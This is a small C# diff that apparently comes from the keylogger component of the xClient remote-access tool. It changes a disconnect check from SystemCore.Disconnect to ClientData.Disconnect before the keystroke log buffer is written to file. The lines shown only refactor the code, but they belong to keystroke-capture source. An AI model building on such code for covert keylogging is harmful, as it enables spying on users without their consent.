@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Text;
 using System.Windows.Forms;
+using xClient.Core.Data;
 using xClient.Core.Helper;
 using xClient.Core.MouseKeyHook;
 using Timer = System.Timers.Timer;
@@ -236,7 +237,7 @@ namespace xClient.Core.Utilities
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_logFileBuffer.Length > 0 && !SystemCore.Disconnect)
+            if (_logFileBuffer.Length > 0 && !ClientData.Disconnect)
                 WriteFile();
         }
 
